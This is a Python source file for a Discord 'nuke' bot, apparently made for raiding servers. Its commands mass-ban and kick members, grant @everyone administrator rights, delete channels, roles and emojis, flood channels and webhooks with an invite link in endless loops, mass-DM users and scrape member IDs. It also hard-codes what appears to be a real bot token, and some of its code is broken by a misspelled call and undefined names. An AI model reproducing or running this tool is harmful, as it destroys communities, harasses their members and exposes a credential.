import discord
from discord.ext import commands
import os
import random 
from discord import Webhook, AsyncWebhookAdapter
from discord import Permissions

fenixplayz = commands.Bot(command_prefix="$", intents = discord.Intents.all()) #input your bot prefix

token =("MTIwNTIxNTcxNjY2NDQxNDM1MA.G-czhG.P0wMfWd23qwQxqfNfDvGH5p04F6pOBghpkDceY") # input your bot token

CHANNEL_NAMES = ['haidar-wizzed-u'] # Your Channel Names
MESSAGE_CONTENTS = ["@everyone haidar wuz here https://discord.gg/DKGz6HMCeC "] # Your Message Content That Has To Be Spammed
WEBHOOK_NAMES = ['haidar'] # Enter Your Webhook Names

fenixplayz.remove_command('help')

@fenixplayz.command("ban")
async def ban(ctx):
        await ctx.message.delete()
        for member in ctx.guild.members:
         if member.id != 695070568826929214:
          for user in list(ctx.guild.members):
            try:
                await ctx.guild.ban(user)
                print (f"{user.name} Was Banned")
            except:
                pass


@fenixplayz.command()
async def dm(ctx, *, message:str):
  await ctx.message.delete()
  for user in list(ctx.guild.members):
    try:
      await user.send(message)
      print(f"\x1b[38;5;34mDMed All Members In {ctx.guild.name}!")
    except:
      print(f"\x1b[38;5;196mUnable To DM Members In {ctx.guild.name}!")



@fenixplayz.command(pass_context=True)
async def admin(ctx):
  await ctx.message.delete()
  for role in list(ctx.guild.roles):
             if role.name == '@everyone':
                  try:
                      await role.edit(permissions=Permissions.all())
                      print("@everyone role has admin!") 
                  except:
                      print("Failed to give everyone admin")



@fenixplayz.event
async def on_ready():
  await fenixplayz.change_presence(activity=discord.Game(name= "haidar owns me"))
print('''$kill for nuke

██╗░░██╗░█████╗░██╗██████╗░░█████╗░██████╗░
██║░░██║██╔══██╗██║██╔══██╗██╔══██╗██╔══██╗
███████║███████║██║██║░░██║███████║██████╔╝
██╔══██║██╔══██║██║██║░░██║██╔══██║██╔══██╗
██║░░██║██║░░██║██║██████╔╝██║░░██║██║░░██║
╚═╝░░╚═╝╚═╝░░╚═╝╚═╝╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝''')

@fenixplayz.command(pass_context=True)
async def name(ctx, *, name):
  await ctx.message.delete()
  await ctx.guild.edit(name=name)

@fenixplayz.command(pass_context=True)
async def emojidel(ctx):
 await ctx.message.delete()
 for emoji in list(ctx.guild.emojis):
            try:
                await emoji.delete()
                print (f"{emoji.name} has been deleted in {ctx.guild.name}")
            except:
                print (f"{emoji.name} has NOT been deleted in {ctx.guild.name}")

@fenixplayz.command()
async def roles(ctx):
  await ctx.message.delete()
  for i in range(1, 1000):
    try:
      await ctx.guild.create_role(name=f"haidar was here")
      print("Created Roles")
    except:
        print("Failed To Create Role")


  
@fenixplayz.command("kill")
async def wizz(ctx, amount=50):
  await ctx.guild.edit(name="/1 lol")
  channels = ctx.guild.channels
  for channel in channels:
    try:
      await channel.delete()
      print(channel.name + " Has been wizzed")
    except:
        pass
        print ("error")
        guild = ctx.message.guild
  for i in range(amount):
    try:  
      await ctx.guild.create_text_channel(random.choice(CHANNEL_NAMES))
      print(f"[{i}] channels made")
    except:
      print("error making channels")
  for role in ctx.guild.roles:
    try:
      await role.delet()
      print(f"{role.name} deleted")

    except:
      print(f"{role.name} not deleted")
  await asyncio.sleep(2)
  for i in range(100):  
    for i in range(1000):
      for channel in ctx.guild.channels:
        try:
          await channel.send(random.choice(MESSAGE_CONTENTS)
        )
          print(f"{channel.name} spammed")
        except:
          print(f"{channel.name} not spammed")
    for member in ctx.guild.members:
      if member.id != 320408390587121664:  
        try:
          await member.ban(reason="haidar")
          print(f"{member.name} banned from {ctx.guild.name}")
        except:
          print(f"{member.name} not banned from {ctx.guild.name}")  

        
@fenixplayz.event
async def on_guild_channel_create(channel):
  webhook =await channel.create_webhook(name = random.choice(WEBHOOK_NAMES))  
  while True:  
    await channel.send(random.choice(MESSAGE_CONTENTS))
    await webhook.send(random.choice(MESSAGE_CONTENTS), username=random.choice(WEBHOOK_NAMES))



@fenixplayz.command("kick")
async def kick(ctx):
  await ctx.message.delete()
  for member in ctx.guild.members:
    try:
      await member.kick(reason="/haidar")
      print(member.name + "Has Been Kicked")
    except:
      print(member.name + "Has Not Been Kicked")

@fenixplayz.command(aliases=["h", "Help"])
async def help(ctx, category=None):
    if category is None:
        embed = discord.Embed(color=0x2f3136)
        embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/951469764117680154/985215341602943026/6420-lines.gif")
        embed.add_field(name="**__8948 Nuke Commands__**",
                        value=f"**• haidar Prefix is `$` | Total Commands - ``21``**",
                        inline=False)
        embed.add_field(
            name="__COMMANDS__",
            value=
            f"**`$kill`, `$ban`, `$kick`, `$roles`, `$emojidel`, `$dm`, `$name`, `$admin`, `$prune`, `$checkprune`, `$scrape`, `$stream`, `$game`, `$listening`, `$watching`, `$delchannel`, `$delroles`, `$status`, `$ping`, `$getroles`, `$renameall`**",
            inline=True)
        embed.set_image(url="")
        await ctx.reply(embed=embed)

@fenixplayz.command()
async def prune(ctx):
  await ctx.reply(" Initiating a prune request.")
  await ctx.guild.prune_members(days=1, roles=ctx.guild.roles)
  await ctx.reply("Successfully Pruned Members With 1 Day Of Inactivity")

@fenixplayz.command()
async def scrape(ctx):
  await ctx.message.delete()
  mem = ctx.guild.members
  chl = ctx.guild.channels
  rle = ctx.guild.roles
  for member in mem:
      try:
        mfil = open("members.txt","a")

        mfil.write(str(member.id) + "\n")
        mfil.close()
        await ctx.send("Succesfully Scraped!")

      except Exception as e:
        await ctx.send("Failed Scraping Members!")
  for channel in chl:
      try:
        cfil = open("channels.txt","a")
        cfil.write(str(channel.id) + "\n")
      except Exception as e:
        await ctx.send("Failed Scraping Channels!")
  for role in rle:
      try:
        rfil = open("roles.txt","a")
        rfil.write(str(role.id) + "\n")
      except Exception as e:
        await ctx.send("Failed Scraping Roles!")

@fenixplayz.command()
async def stream(ctx, *, message): 
    stream = discord.Streaming(
        name=message,
        url=stream_url, 
    )
    await fenixplayz.change_presence(activity=stream) 
    await ctx.reply('Streaming started')   

@fenixplayz.command()
async def game(ctx, *, message):
    game = discord.Game(
        name=message
    )
    await fenixplayz.change_presence(activity=game)
    await ctx.reply('Playing started')

@fenixplayz.command()
async def listening(ctx, *, message):
    await fenixplayz.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.listening, 
            name=message, 
        ))
    await ctx.reply('Listening started')

@fenixplayz.command()
async def watching(ctx, *, message):
    await fenixplayz.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.watching, 
            name=message
        ))
    await ctx.reply('started!')

@fenixplayz.command()
async def checkprune(ctx,days: int):
  guild = ctx.guild
  po = await ctx.guild.estimate_pruned_members(days=days, roles=guild.roles)
  await ctx.channel.send(f"> **Prune Rate is {po}**")

@fenixplayz.command(aliases=["delchannel"])
async def delchannels(ctx):
    await ctx.message.delete()
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            return

@fenixplayz.command(aliases=["deleteroles"])
async def delroles(ctx):
    await ctx.message.delete()
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass

@fenixplayz.command()
async def status(ctx):
    await ctx.send(f"**The Bot is Working Fine And Have A Latency of Around - `{round(fenixplayz.latency * 1000)}`ms!**")

@fenixplayz.command()
async def ping(ctx):
    await ctx.send(f"Ping is `{round(fenixplayz.latency * 1000)}`ms")

@fenixplayz.command()
async def getroles(ctx):
	roles = list(ctx.guild.roles)
	roles.reverse()
	roleStr = ''
	for role in roles:
		if role.name == '@everyone':
			roleStr += '@\u200beveryone'
		else:
			roleStr += role.name + '\n'

	print(roleStr)
	await ctx.send(roleStr)

@fenixplayz.command(pass_context=True)

async def renameall(ctx, rename_to):
    await ctx.message.delete()
    for member in list(fenixplayz.get_all_members()):
        try:
            await member.edit(nick=rename_to)
            print (f"{member.name} has been renamed to {rename_to}")
        except:
            print (f"{member.name} has NOT been renamed")
        print("Action completed: Rename all")
      
fenixplayz.run(token)
